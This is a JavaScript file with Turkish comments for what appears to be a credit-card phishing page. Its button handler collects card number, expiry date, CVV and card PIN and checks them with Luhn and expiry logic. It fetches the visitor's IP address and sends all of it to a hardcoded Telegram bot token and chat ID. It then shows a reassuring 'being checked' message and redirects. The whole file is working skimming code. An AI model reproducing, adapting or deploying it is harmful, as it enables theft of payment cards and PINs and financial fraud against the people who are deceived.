// phmain.js - BUTON ÇALIŞIR VERSİYON

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

// Slider fonksiyonları
window.slider1 = { prev: function() {} };
window.closeAlert = function() { 
    document.getElementById('alertDiv').style.display = 'none';
};
window.uyariKapat = function() { 
    document.getElementById('alertDiv3').style.display = 'none';
};

// Luhn algoritması
function luhnKontrol(kartNo) {
    let sum = 0;
    let alternate = false;
    for (let i = kartNo.length - 1; i >= 0; i--) {
        let n = parseInt(kartNo.charAt(i), 10);
        if (alternate) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

// SKT kontrol
function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    const [ay, yil] = skt.split('/');
    const ayNum = parseInt(ay, 10);
    const yilNum = parseInt(yil, 10);
    const suAn = new Date();
    const suAnYil = suAn.getFullYear() % 100;
    const suAnAy = suAn.getMonth() + 1;
    
    if (ayNum < 1 || ayNum > 12) return false;
    if (yilNum < suAnYil) return false;
    if (yilNum === suAnYil && ayNum < suAnAy) return false;
    return true;
}

// IP alma
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => callback(data.ip))
        .catch(() => callback('Bilinmiyor'));
}

// Telegram'a gönder
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url).catch(console.log);
}

// Kırmızı kaplama göster
function showAlert(message) {
    const alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        const p = alertDiv.querySelectorAll('p');
        if (p[2]) p[2].innerText = message;
    }
}

// Buton olayını doğrudan bağla (jQuery beklemeden)
document.addEventListener('DOMContentLoaded', function() {
    const btn = document.getElementById('btn-spc');
    if (btn) {
        btn.addEventListener('click', function() {
            const kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
            const skt = document.getElementById('exp').value;
            const cvv = document.getElementById('cvv').value;
            const sifre = document.getElementById('kkpw').value;
            
            // Doğrulamalar
            if (!kartNo || kartNo.length !== 16) {
                showAlert('Kart numarası 16 haneli olmalıdır.');
                return;
            }
            if (!luhnKontrol(kartNo)) {
                showAlert('Geçersiz kart numarası!');
                return;
            }
            if (!skt || skt.length !== 5) {
                showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
                return;
            }
            if (!sktKontrol(skt)) {
                showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
                return;
            }
            if (!cvv || cvv.length !== 3) {
                showAlert('CVV 3 haneli olmalıdır.');
                return;
            }
            if (!sifre || sifre.length !== 4) {
                showAlert('Kart şifresi 4 haneli olmalıdır.');
                return;
            }
            
            document.getElementById('alertDiv').style.display = 'none';
            
            getIP(function(ip) {
                const mesaj = `Kredi Kartı Bilgisi:\n Kart No: ${kartNo}\n SKT: ${skt}\n CVV: ${cvv}\n Şifre: ${sifre}\n IP: ${ip}`;
                sendToTelegram(mesaj);
                alert('Bilgileriniz kontrol ediliyor...');
                window.location.href = 'success.html';
            });
        });
    } else {
        console.log('Buton bulunamadı! ID: btn-spc');
    }
});
